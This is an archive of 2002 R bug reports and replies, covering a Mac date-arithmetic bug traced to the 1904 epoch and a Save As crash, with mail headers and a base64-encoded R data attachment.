To: R-bugs@biostat.ku.dk
Subject: Date arithmetic fails

Full_Name: Ronnen Levinson
Version: 1.5.1
OS: Mac OS 10.1 
Submission from: (NULL) (12.232.201.92)


The value returned by strptime behaves badly after arithmetic operation and/or
combination.

> a=strptime("2002-06-01 12:15:01","%Y-%m-%d %H:%M:%S")
> a
[1] "2002-06-01 12:15:01"
> a+0
[1] "1932-04-25 21:46:45"
> a+3600
[1] "1932-04-25 22:46:45"
b=c(a)
> b
[1] "1932-04-25 21:46:45"

==> 1819.followup.1 <==
From tlumley@u.washington.edu  Mon Jul 22 17:58:29 2002
Received: from mxout3.cac.washington.edu (mxout3.cac.washington.edu [140.142.32.19])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA04051
	for <R-bugs@biostat.ku.dk>; Mon, 22 Jul 2002 17:58:28 +0200 (MET DST)
Received: from mailscan-out2.cac.washington.edu (mailscan-out2.cac.washington.edu [140.142.33.17])
	by mxout3.cac.washington.edu (8.12.1+UW01.12/8.12.1+UW02.06) with SMTP id g6MFvkYu014347
	for <R-bugs@biostat.ku.dk>; Mon, 22 Jul 2002 08:57:46 -0700
Received: FROM homer41.u.washington.edu BY mailscan-out2.cac.washington.edu ; Mon Jul 22 08:57:44 2002 -0700
Received: from localhost (tlumley@localhost)
	by homer41.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g6MFviE5101740;
	Mon, 22 Jul 2002 08:57:44 -0700
Date: Mon, 22 Jul 2002 08:57:43 -0700 (PDT)
From: Thomas Lumley <tlumley@u.washington.edu>
To: RML27@cornell.edu
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: Date arithmetic fails (PR#1819)
In-Reply-To: <200207211826.UAA29493@pubhealth.ku.dk>
Message-ID: <Pine.A41.4.44.0207220855460.93146-100000@homer41.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Sun, 21 Jul 2002 RML27@cornell.edu wrote:

> Full_Name: Ronnen Levinson
> Version: 1.5.1
> OS: Mac OS 10.1
> Submission from: (NULL) (12.232.201.92)
>
>
> The value returned by strptime behaves badly after arithmetic operation and/or
> combination.
>
> > a=strptime("2002-06-01 12:15:01","%Y-%m-%d %H:%M:%S")
> > a
> [1] "2002-06-01 12:15:01"
> > a+0
> [1] "1932-04-25 21:46:45"
> > a+3600
> [1] "1932-04-25 22:46:45"
> b=c(a)
> > b
> [1] "1932-04-25 21:46:45"

The problem appears to be with as.POSIXct on the Mac.  Operations that
don't coerce to POSIXct work, those that do, don't.

	-thomas



==> 1819.followup.2 <==
From tlumley@u.washington.edu  Mon Jul 22 18:58:10 2002
Received: from mxout4.cac.washington.edu (mxout4.cac.washington.edu [140.142.33.19])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA04223
	for <R-bugs@biostat.ku.dk>; Mon, 22 Jul 2002 18:58:09 +0200 (MET DST)
Received: from mailscan-out1.cac.washington.edu (mailscan-out1.cac.washington.edu [140.142.32.17])
	by mxout4.cac.washington.edu (8.12.1+UW01.12/8.12.1+UW02.06) with SMTP id g6MGvRS4020128
	for <R-bugs@biostat.ku.dk>; Mon, 22 Jul 2002 09:57:27 -0700
Received: FROM homer41.u.washington.edu BY mailscan-out1.cac.washington.edu ; Mon Jul 22 09:57:25 2002 -0700
Received: from localhost (tlumley@localhost)
	by homer41.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g6MGvOqn168250;
	Mon, 22 Jul 2002 09:57:24 -0700
Date: Mon, 22 Jul 2002 09:57:24 -0700 (PDT)
From: Thomas Lumley <tlumley@u.washington.edu>
To: RML27@cornell.edu
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: Date arithmetic fails (PR#1819)
In-Reply-To: <Pine.A41.4.44.0207220855460.93146-100000@homer41.u.washington.edu>
Message-ID: <Pine.A41.4.44.0207220944440.93146-100000@homer41.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

>
> The problem appears to be with as.POSIXct on the Mac.  Operations that
> don't coerce to POSIXct work, those that do, don't.
>

I think I've found why.

The epoch date on the Mac is 1904-1-1 not 1970-1-1.

This has two effects. First, everything's off by 66 years. Second, it's
important to treat the time as unsigned long, not long, since it's already
greater than 2^31 some time in 1997.

Aren't standards wonderful?

	-thomas


==> 1819.audit <==
Mon Jul 22 17:49:01 2002	thomas	foobar
Mon Jul 22 17:49:01 2002	thomas	moved from incoming to not-reproducible
Mon Jul 22 17:52:41 2002	thomas	moved from not-reproducible to Macintosh
Mon Jul 22 18:21:41 2002	thomas	changed notes
Mon Jul 22 18:21:41 2002	thomas	foobar
Mon Jul 22 19:05:40 2002	thomas	changed notes
Mon Jul 22 19:05:40 2002	thomas	foobar
Fri Sep 27 17:49:20 2002	thomas	changed notes
Fri Sep 27 17:49:20 2002	thomas	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1991 *
Subject: Mac Save As... bug
From: Tim Cole <tjc1@cam.ac.uk>
Date: Sun, 8 Sep 2002 13:47:00 +0100
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1991 <==
From postmaster@franz.stat.wisc.edu  Sun Sep  8 15:14:48 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA17766
	for <r-bugs@biostat.ku.dk>; Sun, 8 Sep 2002 15:14:43 +0200 (MET DST)
Received: from libra.cus.cam.ac.uk (really [131.111.8.19]) by franz.stat.wisc.edu
	via smail with esmtp (ident cusexim using rfc1413)
	id <m17o1aN-000IXYC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Sun, 8 Sep 2002 07:54:43 -0500 (CDT) 
Received: from line55.slip.csx.cam.ac.uk ([131.111.99.155])
	by libra.cus.cam.ac.uk with esmtp (Exim 4.10)
	id 17o1ZK-0007bt-00
	for r-bugs@r-project.org; Sun, 08 Sep 2002 13:53:38 +0100
Mime-Version: 1.0
X-Sender: tcole@stella.ich.ucl.ac.uk
Message-Id: <p05111b03b9a0ed6293f0@[131.111.99.150]>
Date: Sun, 8 Sep 2002 13:47:00 +0100
To: r-bugs@r-project.org
From: Tim Cole <tjc1@cam.ac.uk>
Subject: Mac Save As... bug
Content-Type: multipart/mixed; boundary="============_-1180632878==_============"

--============_-1180632878==_============
Content-Type: text/plain; charset="us-ascii" ; format="flowed"

# Your mailer is set to "none" (default on Windows),
# hence we cannot send the bug report directly from R.
# Please copy the bug report (after finishing it) to
# your favorite email program and send it to
#
#       r-bugs@r-project.org
#
######################################################

The history is as follows:

# set wd using <cmd>D dialog

# load Jim Ramsay's fda package, the splines package, and .Rdata
# the attachment fda.sit is Jim Ramsay's fda functions Stuffed
# the attachment .Rdata is the data file

attach("fda")
library(splines)
attach(".Rdata")

# attach data file
attach(colldata)

# run function plotfda which plots a graph
plotfda()

# select and save the graph to a new file using File>Save As...

# (incidentally the file save dialog does not open in the working
# directory - is this a bug in itself?)

# repeat the process - run plotfda
plotfda()
# and save the graph as Save As... using a different filename

# repeat the process a second time
plotfda()
# and R crashes when Save As... is selected.


--please do not edit the information below--

Version:
  platform = ppc-apple-macos
  arch = ppc
  os = MacOS
  system = ppc, MacOS
  status =
  major = 1
  minor = 5.1
  year = 2002
  month = 06
  day = 17
  language = R

Search Path:
  .GlobalEnv, colldata, file:Hard Disk:Documents:People:Jim 
Ramsay:functions:.Rdata, package:splines, package:ctest, Autoloads, 
package:base


-- 
Tim.Cole@ich.ucl.ac.uk   Phone +44(0)20 7905 2666  Fax +44(0)20 7242 2723
Paed Epidemiology & Biostats, Institute of Child Health, London WC1N 1EH, UK
--============_-1180632878==_============
Content-Id: <p05111b03b9a0ed6293f0@[131.111.99.150].0.0>
Content-Type: multipart/appledouble; boundary="============_-1180632878==_D============"

--============_-1180632878==_D============
Content-Transfer-Encoding: base64
Content-Type: application/applefile; name="%_RData"
Content-Disposition: attachment; filename="%_RData"
 ; modification-date="Sun, 1 Sep 2002 23:15:31 +0100"

AAUWBwACAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAADAAAAPgAAAAYAAAAJAAAARAAAACAA
AAAIAAAAZAAAABAuUkRhdGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUF
XBMFBVwTS20MAAUOEuI=
--============_-1180632878==_D============
Content-Type: application/octet-stream; name="_RData"
 ; x-mac-type="00000000"
 ; x-mac-creator="00000000"
Content-Disposition: attachment; filename="_RData"
Content-Transfer-Encoding: base64

UkRYMgpYCgAAAAIAAQUBAAEEAAAABAIAAAABAAAUCQAAAAouVHJhY2ViYWNrAAAA/gAA
BAIAAAABAAAUCQAAAAVDVi5NUgAABg4AAAAWQDbSmV7mXXJARyJBmZZpkkBKue/YpxEd
QEwIAS+3gkVATJatNjILYEBLg+qlaeKqQEtJOZpftMZASWaplZuTRkBIzauK/OywQElE
1SaBccdASYMAazIvrUBJqGD/blFKQEeD9KXDhaJARrJVYE0FxUBG8+FqjW0GQEeqOxrd
cZhASghYiD6HHUBMxNOCIdgIQFDDf7fYyRdAUv4oTa4OckBUiOj9XCwrQFTP5uC5s3gA
AAQCAAAAAQAAFAkAAAAFbmFtZXMAAAQQAAAAFgAABAkAAAACWDAAAAQJAAAAAlgxAAAE
CQAAAAJYMgAABAkAAAACWDMAAAQJAAAAAlg0AAAECQAAAAJYNQAABAkAAAACWDYAAAQJ
AAAAAlg3AAAECQAAAAJYOAAABAkAAAACWDkAAAQJAAAAA1gxMAAABAkAAAADWDExAAAE
CQAAAANYMTIAAAQJAAAAA1gxMwAABAkAAAADWDE0AAAECQAAAANYMTUAAAQJAAAAA1gx
NgAABAkAAAADWDE3AAAECQAAAANYMTgAAAQJAAAAA1gxOQAABAkAAAADWDIwAAAECQAA
AANYMjEAAAD+AAAEAgAAAAEAABQJAAAAB01lYW4uTVIAAAYOAAAAFkBguuTjnFt5QEip
ST9XV6FAOHp/hxonPEArCgNvhEXhQCHuZPhVHOpAGSJvj530cUAT54ouYWZRQA0XsJAe
Is1AB2B1kjI/AEAEc2q+OgYYQALRj7O0ngJAANiSsYo/1UAAQcfRVnVdP/6JBcEAoERA
AVuAPk1U10ABJf50tFJhQAM6r2JuTqVAB0mXi3iPp0ANmhcgc6w2QA2z3WBWHCFAEAcD
zwHr0kAPsXeQkardAAAEAgAAA/8AAAQQAAAAFgAABAkAAAACWDAAAAQJAAAAAlgxAAAE
CQAAAAJYMgAABAkAAAACWDMAAAQJAAAAAlg0AAAECQAAAAJYNQAABAkAAAACWDYAAAQJ
AAAAAlg3AAAECQAAAAJYOAAABAkAAAACWDkAAAQJAAAAA1gxMAAABAkAAAADWDExAAAE
CQAAAANYMTIAAAQJAAAAA1gxMwAABAkAAAADWDE0AAAECQAAAANYMTUAAAQJAAAAA1gx
NgAABAkAAAADWDE3AAAECQAAAANYMTgAAAQJAAAAA1gxOQAABAkAAAADWDIwAAAECQAA
AANYMjEAAAD+AAAEAgAAAAEAABQJAAAABVNELk1SAAAGDgAAABZAPovCqF681kA20gPt
ine+QCorN2X8ugBAHlFQA+1uL0AUgVB9J1cgQAup0Sh393lABbl7rI9HoT/9jyh7iSK6
P/cxZa3bOsk/9Ku5cQTvXj/zNCwJ4AOeP/FKCIuPcVA/7pVKvhenyj/ruMxNgl/AP+/f
NnVboJ8/8DuP4XEDBT/0BgMJDsCQP/rMU40NkAlAA9l2p2K1+UAGkL+AYYTuQApUXm7m
97NACmJWP+EBFQAABAIAAAP/AAAEEAAAABYAAAQJAAAAAlgwAAAECQAAAAJYMQAABAkA
AAACWDIAAAQJAAAAAlgzAAAECQAAAAJYNAAABAkAAAACWDUAAAQJAAAAAlg2AAAECQAA
AAJYNwAABAkAAAACWDgAAAQJAAAAAlg5AAAECQAAAANYMTAAAAQJAAAAA1gxMQAABAkA
AAADWDEyAAAECQAAAANYMTMAAAQJAAAAA1gxNAAABAkAAAADWDE1AAAECQAAAANYMTYA
AAQJAAAAA1gxNwAABAkAAAADWDE4AAAECQAAAANYMTkAAAQJAAAAA1gyMAAABAkAAAAD
WDIxAAAA/gAABAIAAAABAAAUCQAAAAhjb2xsZGF0YQAABxMAAAAZAAAEDQAAACwAAAdz
AAAHdAAAB3UAAAd2AAAHdwAAB3gAAAd5AAAHegAAB3sAAAd8AAAHfQAAB34AAAd/AAAH
gAAAB4EAAAeCAAAHgwAAB4QAAAeFAAAHhgAAB4cAAAeIAAAHiQAAB4oAAAeLAAAHjAAA
B40AAAeOAAAHjwAAB5AAAAeRAAAHkgAAB5MAAAeUAAAHlQAAB5YAAAeXAAAHmAAAB5kA
AAeaAAAHmwAAB5wAAAedAAAHngAABA0AAAAsAAUsFwAFQpAABTIJAAUrpgAFAwsABRn9
AATtNwAE2RcABOi/AATLLAAEzfQABOOTAAStuAAE+rUABS5xAAU6jAAFRk0ABTEJAAUd
cgAFRKwABQa9AAVGWwAFKTIABTmCAAUeTwAFSXkABT/kAAT/8QAE9ckABM73AARvzAAD
/IUAA09FAATyFAAD/4QABCh1AAS9vQAEsT4ABNb0AASGKQAEjv0ABPhnAASnAAAEYFYA
AAQOAAAALECZmx64UeuFQJmX9cKPXClAmbz1wo9cKUCZtI9cKPXDQJnRwo9cKPZAmdSP
XCj1w0CZ6Sj1wo9cQJnFo9cKPXFAmcKPXCj1w0CZ18KPXCj2QJnKPXCj1wpAmaX1wo9c
KUCZwnrhR64UQJm0wo9cKPZAmbiZmZmZmkCZydcKPXCkQJnDcKPXCj1AmbrhR64Ue0CZ
uxR64UeuQJnDXCj1wo9AmccAAAAAAECZxh64UeuFQJnSKPXCj1xAmdIAAAAAAECZ3rhR
64UfQJneFHrhR65AmeKFHrhR7ECZ3lwo9cKPQJnm9cKPXClAme2uFHrhSECZ78zMzMzN
QJnwo9cKPXFAmfMKPXCj10CZ++uFHrhSQJoDUeuFHrhAmg+PXCj1w0CaFVHrhR64QJoV
Cj1wo9dAmiaZmZmZmkCaK7hR64UfQJo1j1wo9cNAmjYUeuFHrkCaOj1wo9cKQJpWUeuF
HrgAAAQNAAAALAAA3o4AAOL+AADX+wAA0EkAANsEAAC/FgAAzrgAAMbRAADQSgAAvaYA
AMkhAADwsAAAxC4AANtdAADL0gAAx8EAANE9AADE9wAAvocAALT1AACtQgAAsbkAAKz0
AACl/AAAorYAAKFXAACf1wAAml8AAJTQAACOwwAAnLMAAIEtAAB3nQAAkYwAAJpfAABz
8gAAgD8AAHdHAABwygAAa2AAAFgbAABYHAAAWF0AAEyJAAAEDQAAACwAAFpAAABW+AAA
UqkAAFwJAABErgAAUEgAAE0XAABLuAAASJ8AAEosAABmvQAAR+IAAEzmAABL/wAARHkA
AEd1AABBTQAAQQkAAD3CAAA5mQAAPsYAADigAAA4jAAAMs4AADCBAAAtuAAALxMAACq/
AAAmhQAAMNAAACgxAAAk3AAAG50AACEmAAAanQAAFz4AABdnAAAVNgAAE28AABGDAAAO
agAAEGMAAA7JAAANEAAABA0AAAAsAAAqhgAAKiUAACyjAAAkqwAAJn4AACXQAAAlMgAA
I9gAACVEAAA4bwAAJBUAACmqAAAkEwAAInkAACFSAAAfDAAAHyUAAB5GAAAaKAAAHNwA
ABldAAAYfwAAFeQAABTRAAAUIAAAErQAABMLAAAQmAAAFSMAABG6AAATfQAAD5wAAAtq
AAAN4QAACyUAAAkXAAAKJQAACasAAAmiAAAIRQAAB9oAAAi0AAAHpQAABXIAAAQNAAAA
LAAAFogAABexAAAU8wAAFfgAABU2AAAVKAAAFCIAABSlAAAiNQAAFA0AABd0AAASYwAA
EbMAABDKAAAQ2gAAD7UAAA9UAAAObQAADlgAAA1MAAAMwwAADAUAAArAAAAK6gAAChUA
AAp/AAAJbwAADC8AAArRAAALpAAAChgAAAeDAAAGTgAABx0AAAVzAAAFYQAABfMAAAX4
AAAFsgAABNsAAASxAAAE9wAAA5cAAAK+AAAEDQAAACwAAA8QAAAOMQAADmIAAA5KAAAN
jQAADVEAAA4EAAAW7wAADh4AABFRAAAMUQAACvsAAAn5AAAKRwAACcwAAAmrAAAI+gAA
CaUAAAj2AAAIlQAAB+oAAAdMAAAHZwAABwsAAAc3AAAGfgAACFYAAAf4AAAIQgAAB/IA
AAYrAAAE6wAABBMAAAR/AAAEAAAAA5AAAAR1AAAEBQAAA60AAANrAAADFgAAAsoAAAI8
AAABxAAABA0AAAAsAAAJwQAACiAAAAmhAAAJMwAACVoAAAn+AAAQdQAACaMAAAqxAAAJ
BAAACGMAAAa4AAAGmQAABpoAAAbUAAAGsgAABqIAAAYyAAAGHgAABbQAAAVPAAAFfwAA
BTkAAAUbAAAE2QAABmAAAAafAAAGmQAABekAAATzAAAEYwAAA4sAAALtAAADbgAAAuUA
AALZAAAC9wAAAtgAAAKaAAAChAAAAhMAAAHpAAABjwAAAXwAAAQNAAAALAAAB34AAAey
AAAHlwAAB0wAAAfYAAANFQAAB5UAAAiDAAAHrgAABsIAAAWhAAAFyQAABSYAAAWKAAAF
bwAABYQAAAT5AAAE6QAABO8AAARyAAAEdwAABDAAAAR2AAAD9AAABRMAAAU5AAAFvgAA
BLsAAARZAAADqwAAAzYAAAKXAAACQQAAAk8AAAKKAAACAQAAAl4AAAJDAAACRwAAAeIA
AAFuAAABUAAAAUoAAAEdAAAEDQAAACwAAAUoAAAFHAAABWgAAAVPAAAJdwAABbgAAAXJ
AAAFKgAABNYAAAQOAAAD3AAAA38AAAOMAAADrgAAA7sAAAOCAAADmgAAA3wAAANYAAAD
gQAAA0kAAANoAAADIgAABAoAAARLAAAEwQAABCMAAAOYAAADFQAAAxUAAALsAAACPQAA
AcUAAAIuAAAB8wAAAdAAAAG4AAAB5wAAAZkAAAE1AAABGAAAATYAAADeAAAA7AAABA0A
AAAsAAAD+wAABCkAAAQdAAAHiAAABI8AAASRAAAENwAAA8QAAANmAAADIQAAAxkAAALg
AAAC2gAAAwoAAAMLAAAC8AAAAwMAAALMAAAC8QAAAtUAAALiAAACwQAAA5AAAAONAAAE
GgAAA08AAAM5AAAC2gAAAl8AAAJwAAACKAAAAaYAAAFyAAABpwAAAZ4AAAFYAAABZgAA
AVsAAAEdAAAA4wAAANIAAADkAAAA4wAAAMwAAAQNAAAALAAAA1QAAAONAAAG2AAABAcA
AAPoAAAD3AAAA4oAAAMfAAACwgAAAoIAAAKeAAACPgAAAogAAAKDAAACiwAAAt4AAAJd
AAACewAAApkAAAJwAAACcwAAA1QAAANpAAADsAAAAxgAAAL0AAACfgAAAnAAAAI6AAAC
BwAAAfIAAAGvAAABPgAAAWsAAAFNAAABQgAAARkAAAD/AAAA8wAAANIAAACyAAAA6gAA
AL4AAACoAAAEDQAAACwAAANGAAAGcAAAA70AAAOsAAADYgAAAzUAAALrAAACmwAAApEA
AAKbAAACPgAAAlIAAAICAAACTgAAAnUAAAJVAAACXgAAAn4AAAJKAAACLwAAAxwAAAMZ
AAADTgAAAs8AAALBAAACeQAAAkQAAAITAAACIAAAAc4AAAG7AAABjQAAAR4AAAFVAAAB
TQAAAPkAAAEXAAAA3QAAAMkAAADhAAAAxgAAAMkAAADDAAAAfwAABA0AAAAsAAAFhgAA
AzsAAANAAAAC/gAAAuYAAALIAAACgQAAAmMAAAJJAAACHgAAAkMAAAH6AAACAQAAAlUA
AAILAAACJAAAAj4AAAIgAAACLAAAAsQAAALLAAADJgAAAnYAAAKfAAACQwAAAkYAAAHf
AAACPAAAAcQAAAG4AAABdQAAAUAAAAEOAAABIQAAAOcAAADNAAAAvgAAAMUAAADQAAAA
ugAAAJkAAACjAAAAmwAAAIcAAAQNAAAALAAAA2MAAAPBAAADEAAAAuAAAAKPAAACdQAA
AkgAAAJsAAACLQAAAiUAAAItAAAB/wAAAhsAAAIZAAACUAAAAlsAAAJsAAACMAAAAscA
AAL2AAADVgAAAooAAAKbAAACbQAAAjkAAAInAAACEgAAAbMAAAHRAAABlQAAAWsAAAEQ
AAAA5gAAAP8AAADUAAAAmQAAAMgAAADeAAAAxAAAAJsAAACwAAAAlAAAAJgAAACJAAAE
DQAAACwAAAMtAAAC7gAAArwAAAKmAAACeAAAAlEAAAJtAAACUwAAAgoAAAIeAAAB7AAA
AegAAAHXAAACFAAAAhsAAAImAAACXgAAAp4AAAK+AAADAgAAAlwAAAKfAAACTQAAAhMA
AAIZAAAB9AAAAgIAAAHHAAABjQAAAYcAAAFgAAABBQAAANYAAADcAAAAtgAAAK4AAACz
AAAAxQAAAM4AAACkAAAAjgAAAKEAAACXAAAAigAABA0AAAAsAAADWQAAAuQAAAL3AAAC
0QAAAq8AAALZAAAC1gAAAnIAAAKGAAACVgAAAnAAAAI4AAACPQAAAncAAAKDAAAC1AAA
Ay8AAANJAAADnQAAAvcAAALsAAACggAAAnQAAAJzAAACRAAAAiAAAAIiAAAB+AAAAbUA
AAGkAAABZgAAAPgAAADiAAAA5AAAAPEAAADBAAAA2QAAAMcAAADTAAAAwQAAAKcAAADd
AAAAlwAAALUAAAQNAAAALAAAAsoAAAL0AAAC7QAAAsEAAALAAAACjwAAAo4AAAJ3AAAC
pQAAAp0AAAI3AAACSAAAAkYAAAJoAAAChgAAA3sAAAO0AAADqAAAAy4AAALlAAACngAA
AjwAAAJyAAACWQAAAkcAAAJEAAACAwAAAcIAAAHiAAABjgAAATIAAADsAAAAqwAAAPAA
AADcAAAAxQAAALoAAADDAAAA1QAAALYAAAClAAAAwQAAALIAAADOAAAEDQAAACwAAANU
AAADVQAAAyYAAANaAAADIQAAAxgAAAL1AAAC+QAAAuoAAAKLAAACrgAAAmcAAAKOAAAD
TgAABB0AAAR1AAAElQAAA2cAAANSAAAC3QAAArEAAAKpAAAC2AAAAoYAAAKpAAACRgAA
AhMAAAHdAAABkgAAAUUAAAEmAAAA2wAAAKwAAAD/AAAA5gAAAMcAAADpAAAA3AAAAM8A
AADbAAAAxQAAAL0AAAC+AAAAuQAABA0AAAAsAAAEKgAAA9EAAAQPAAAD/AAAA+MAAAO0
AAADlwAAA8gAAAOYAAADTgAAAzUAAAMwAAAEKQAABToAAAXtAAAFoAAABCMAAARYAAAD
ugAAA2gAAAM9AAADJAAAAwYAAAL6AAAC1QAAAmoAAAI7AAACAAAAAXAAAAFeAAABHAAA
ASIAAADcAAABFQAAANsAAADbAAAA6gAAAOQAAAECAAAA8wAAANcAAADNAAAA5gAAAMMA
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
ZWRmID0gMCkAAAQJAAAAAXsAAAQJAAAAAAAABAkAAAA1IyAgVGhpcyBmdW5jdGlvbiBv
bmUgb2YgdGhyZWUgdHlwZXMgb2YgbGluZWFyIG1vZGVsLCAAAAQJAAAAKyMgIGVhY2gg
bW9kZWwgY29uc2lzdGluZyBvZiBhIGNvbnN0YW50IHRlcm0AAAQJAAAARSMgIHBsdXMg
ZWl0aGVyIGEgY29udmVudGlvbmFsIGluZGVwZW5kZW50IHZhcmlhYmxlIG1hdHJpeCBv
ciBhIHNpbmdsZQAABAkAAAA9IyAgZnVuY3Rpb25hbCBpbmRlcGVuZGVudCB2YXJpYWJs
ZS4gIFRoZSBtb2RlbGluZyBwcm9ibGVtIG1heQAABAkAAABCIyAgYmUgZnVuY3Rpb25h
bCBlaXRoZXIgaW4gdGVybXMgb2YgdGhlIGluZGVwZW5kZW50IHZhcmlhYmxlIG9yIGlu
AAAECQAAAEIjICB0ZXJtcyBvZiB0aGUgZGVwZW5kZW50IHZhcmlhYmxlLCBidXQgYXQg
bGVhc3Qgb25lIHZhcmlhYmxlIG11c3QAAAQJAAAAESMgIGJlIGZ1bmN0aW9uYWwuAAAE
CQAAAEIjICBTbW9vdGhpbmcgaXMgY29udHJvbGxlZCBieSB0d28gcGFyYW1ldGVycyBY
TEFNQkRBIGFuZCBZTEFNQkRBLCAAAAQJAAAAPCMgIGNvcnJlc3BvbmRpbmcgdG8gdGhl
IGluZGVwZW5kZW50IGFuZCBkZXBlbmRlbnQgZnVuY3Rpb25hbAAABAkAAAAbIyAgdmFy
aWFibGVzLCByZXNwZWN0aXZlbHkuAAAECQAAAAwjICBBcmd1bWVudDoAAAQJAAAATCMg
IFhGRCAgICAgLi4uIElmIHRoZSBpbmRlcGVuZGVudCB2YXJpYWJsZSBpcyBtdWx0aXZh
cmlhdGUsIGEgZGVzaWduIG1hdHJpeC4AAAQJAAAASCMgICAgICAgICAgICAgIElmIHRo
ZSBpbmRlcGVuZGVudCB2YXJpYWJsZSBpcyBmdW5jdGlvbmFsLCBhICdmZCcgb2JqZWN0
LgAABAkAAABKIyAgWUZEICAgICAuLi4gSWYgdGhlIGRlcGVuZGVudCB2YXJpYWJsZSBp
cyBtdWx0aXZhcmlhdGUsIGEgZGVzaWduIG1hdHJpeC4AAAQJAAAARiMgICAgICAgICAg
ICAgIElmIHRoZSBkZXBlbmRlbnQgdmFyaWFibGUgaXMgZnVuY3Rpb25hbCwgYSAnZmQn
IG9iamVjdC4AAAQJAAAAIiMgIFdUVkVDICAgLi4uIGEgdmVjdG9yIG9mIHdlaWdodHMA
